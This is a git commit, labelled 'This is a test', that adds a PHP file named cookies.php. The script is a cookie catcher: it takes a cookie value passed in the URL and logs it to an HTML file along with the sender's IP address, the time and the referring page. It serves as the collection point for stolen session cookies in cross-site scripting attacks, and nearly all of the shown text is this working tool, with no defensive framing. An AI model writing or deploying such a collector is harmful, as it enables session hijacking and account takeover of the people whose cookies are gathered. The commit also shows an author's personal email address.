5218192664446a4f89ef23ff4738909db61470c9
Jonathan Bryan <jonnib24@gmail.com>
2020-07-13 21:29:42 -0400

    This is a test

---
+++ cookies.php
@@ -0,0 +1,12 @@
+<?php
+  $cookie = htmlentities($_GET['c']);
+  $ip = getenv('REMOTE_ADDR');
+  $date = date('D M j Y G:i:s T'); // EST
+  $referer = getenv('HTTP_REFERER');
+  $fp = fopen('cookies.html', 'a');
+  fwrite($fp, 'Cookie: <b>'.$cookie.'</b><br /> IP: <b>'.$ip.'</b><br /> 
+  Date and Time: <b>'.$date.' </b><br /> Referer: <b>'.$referer.'</b><br /><br />');
+  fclose($fp);
+?>
+
+hello
